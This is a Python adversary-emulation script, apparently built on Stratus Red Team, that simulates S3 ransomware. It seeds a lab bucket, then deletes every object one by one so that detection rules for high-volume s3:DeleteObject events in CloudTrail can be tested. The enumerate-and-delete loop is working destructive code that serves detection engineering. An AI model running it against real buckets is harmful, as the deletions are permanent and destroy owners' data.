"""
Technique : aws.impact.s3-ransomware-individual-deletion
Tactic    : Impact (T1485)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target S3 bucket with objects.

How the attack works:
  A ransomware operator deletes S3 objects one at a time using s3:DeleteObject.
  Unlike batch deletion, this generates a separate CloudTrail event for each
  object deleted — producing a high-volume, easily detectable stream of events.
  This pattern is observed in less sophisticated ransomware implementations.

Detection signal:
  - High volume of individual s3:DeleteObject events in rapid succession.
  - Each object deletion appears as a distinct CloudTrail entry.
  - Absence of concurrent PutObject events confirms destructive intent.

Revert:
  - Data is permanently deleted.
  - Run `pulumi destroy && pulumi up` to recreate the bucket and objects.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    bucket_name = infra.get("bucket_name", "")

    if not bucket_name:
        print("[!] bucket_name not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session   = boto3.Session()
    s3_client = session.client("s3")

    object_count = infra.get("object_count", 100)

    # ── Step 0: Seed objects via boto3 (avoids Pulumi S3 DNS race) ───────────
    banner(f"Step 0 — Seed {object_count} objects via boto3 (PutObject x{object_count})")
    for i in range(object_count):
        s3_client.put_object(
            Bucket=bucket_name,
            Key=f"data/file-{i:04d}.txt",
            Body=f"Sensitive data file {i} - target for ransomware individual deletion".encode(),
        )
    print(f"  [+] Seeded {object_count} objects into: {bucket_name}")

    # ── Step 1: Enumerate all objects ─────────────────────────────────────────
    banner("Step 1 — Enumerate objects (ListObjectsV2)")
    all_keys: list[str] = []
    paginator = s3_client.get_paginator("list_objects_v2")
    for page in paginator.paginate(Bucket=bucket_name):
        for obj in page.get("Contents", []):
            all_keys.append(obj["Key"])

    print(f"  [+] Found {len(all_keys)} object(s) in: {bucket_name}")
    if not all_keys:
        print("  [~] Bucket is empty — nothing to delete.")
        return

    # ── Step 2: Delete each object individually ───────────────────────────────
    banner(f"Step 2 — Delete {len(all_keys)} objects individually (DeleteObject x{len(all_keys)})")
    deleted_count = 0
    error_count   = 0

    for key in all_keys:
        try:
            s3_client.delete_object(Bucket=bucket_name, Key=key)
            deleted_count += 1
            if deleted_count % 10 == 0:
                print(f"  [+] Deleted {deleted_count}/{len(all_keys)}...")
        except ClientError as exc:
            error_count += 1
            print(f"  [!] DeleteObject({key}) failed: {exc}")

    banner("Complete")
    print(f"  Objects deleted : {deleted_count}")
    print(f"  Errors          : {error_count}")
    print()
    print(f"CloudTrail events: s3:DeleteObject x{deleted_count}")
    print("\nDetection guidance:")
    print("  Alert on high-volume s3:DeleteObject events (each is a separate event).")
    print("  Correlate with absence of PUT operations to confirm destructive pattern.")
    print("\nRun `pulumi destroy && pulumi up` to recreate the bucket and objects.")


if __name__ == "__main__":
    main()
